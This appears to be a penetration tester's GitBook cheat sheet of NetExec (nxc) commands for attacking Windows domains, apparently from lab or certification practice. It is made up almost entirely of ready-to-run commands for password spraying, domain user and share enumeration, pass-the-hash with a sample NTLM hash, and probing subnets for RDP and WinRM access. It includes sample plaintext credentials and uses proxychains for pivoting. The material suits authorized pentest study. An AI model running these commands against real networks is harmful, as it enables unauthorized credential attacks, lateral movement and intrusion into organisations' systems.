---
description: Various Net Exec commands for every scenario
---

# NXC - Net Exec

### Password Spraying

{% tabs %}
{% tab title="SMB" %}
```shellscript
# Spray one password to all domain users
nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
```
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

### Domain Users

```shellscript
nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > domain-users.txt
```

### Enumerate Share Access as a Domain User

```shellscript
nxc smb domain-ips.txt -u stephanie -p 'LegmanTeamBenzoin!!' --shares
```

### Enumerate Share Access using PtH

```shellscript
proxychains4 nxc smb domain-hosts.txt -H fdf36048c1cf88f5630381c5e38feb8e -u wario -d medtech.com --shares
```

#### Check for RDP Access Across a Subnet (domain creds)

```shellscript
nxc rdp 192.168.163.0/24 -u mike -p 'Darkness1099!' -d corp.com
```

#### Verify local user credentials over SMB

```shellscript
nxc smb 192.168.201.96 -u apache -p 'New2Era4.!' --local-auth
```

#### List shares using a local user on a specific machine

```shellscript
nxc smb 192.168.201.96 -u apache -p 'New2Era4.!' --local-auth --shares
```

#### Verify if WinRM can be utilized with local creds

```shellscript
nxc winrm 192.168.201.96 -u apache -p 'New2Era4.!'
```

#### Spray credentials for winrm access&#x20;

```shellscript
proxychains4 nxc winrm internal-hosts.txt -u wario -p Mushroom!
```

